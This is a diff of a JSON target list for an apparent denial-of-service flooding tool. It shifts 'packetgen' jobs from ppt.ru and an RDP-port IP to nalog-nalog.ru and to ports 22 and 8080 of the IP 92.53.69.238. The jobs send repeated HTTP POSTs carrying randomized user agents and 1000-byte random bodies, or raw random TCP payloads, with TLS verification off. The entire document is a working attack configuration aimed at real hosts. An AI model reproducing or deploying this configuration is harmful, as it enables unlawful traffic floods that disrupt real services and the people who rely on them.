@@ -8,14 +8,14 @@
         },
         {
             "type": "packetgen",
-            "count": 111,
-            "name": "https://ppt.ru",
+            "count": 83,
+            "name": "https://nalog-nalog.ru/",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ppt.ru:443",
+                        "address": "nalog-nalog.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -26,7 +26,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://ppt.ru",
+                            "path": "https://nalog-nalog.ru/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -39,9 +39,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ppt.ru",
-                                "Referer": "https://ppt.ru",
-                                "X-Forwarded-Host": "ppt.ru",
+                                "Origin": "https://nalog-nalog.ru/",
+                                "Referer": "https://nalog-nalog.ru/",
+                                "X-Forwarded-Host": "nalog-nalog.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -52,17 +52,14 @@
         },
         {
             "type": "packetgen",
-            "count": 111,
-            "name": "https://pravo.ppt.ru",
+            "count": 83,
+            "name": "http://nalog-nalog.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "pravo.ppt.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "nalog-nalog.ru:80"
                     }
                 },
                 "packet": {
@@ -70,7 +67,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://pravo.ppt.ru",
+                            "path": "http://nalog-nalog.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -83,9 +80,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://pravo.ppt.ru",
-                                "Referer": "https://pravo.ppt.ru",
-                                "X-Forwarded-Host": "pravo.ppt.ru",
+                                "Origin": "http://nalog-nalog.ru",
+                                "Referer": "http://nalog-nalog.ru",
+                                "X-Forwarded-Host": "nalog-nalog.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -96,14 +93,36 @@
         },
         {
             "type": "packetgen",
-            "count": 111,
-            "name": "tcp://195.182.157.179:3390",
+            "count": 83,
+            "name": "tcp://92.53.69.238:22",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "195.182.157.179:3390"
+                        "address": "92.53.69.238:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 83,
+            "name": "tcp://92.53.69.238:8080",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "92.53.69.238:8080"
                     }
                 },
                 "packet": {
